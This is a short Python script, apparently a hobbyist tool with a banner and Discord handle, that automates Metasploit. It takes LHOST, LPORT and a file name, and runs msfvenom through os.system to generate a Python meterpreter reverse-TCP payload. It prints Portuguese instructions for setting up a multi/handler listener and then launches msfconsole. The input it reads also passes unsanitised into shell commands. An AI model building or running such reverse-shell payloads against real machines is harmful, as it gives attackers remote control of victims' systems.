import os
import sys




print("""
╭╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╱╱╱╱╱╱╱╱╭╮
┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╱╱╱╱╱╱╱╭╯╰╮
┃┃╱╱╭━━┳━━┳━╮╭━━┳━┫┃╱┃┣╮┣╮╭╋━━┳╮╭┳━┻╮╭╋━━┳━╮
┃┃╱╭┫┃━┫╭╮┃╭╮┫┃━┫╭┫╰━╯┃┃┃┃┃┃╭╮┃╰╯┃╭╮┃┃┃╭╮┃╭╯
┃╰━╯┃┃━┫╭╮┃┃┃┃┃━┫┃┃╭━╮┃╰╯┃╰┫╰╯┃┃┃┃╭╮┃╰┫╰╯┃┃
╰━━━┻━━┻╯╰┻╯╰┻━━┻╯╰╯╱╰┻━━┻━┻━━┻┻┻┻╯╰┻━┻━━┻╯
Discord: Leaner#4241""")
print("\n")






def msfvenom():
    lhost = input("LHOST=")
    lport = input("LPORT=")
    program = input("NAME PROGRAM:")
    os.system("msfvenom -p python/meterpreter/reverse_tcp LHOST={} LPORT={} > {}.py".format(lhost,lport,program))
msfvenom()
 
def instruções():
    print("--------------------")
    print("Instruções básicas")
    print("--------------------")
    print("\n")
    print("use multi/handler")
    print("set payload python/meterpreter/reverse_tcp")
    print("LHOST (IP)")
    print("LPORT (PORT)")
    print("exploit")
    

instruções()
print("\n")
def start():
    print("Iniciando postgresql")
    os.system("service postgresql start")
    print ("\n")
    print("Iniciando o msfconsole")
    os.system("msfconsole")
start()
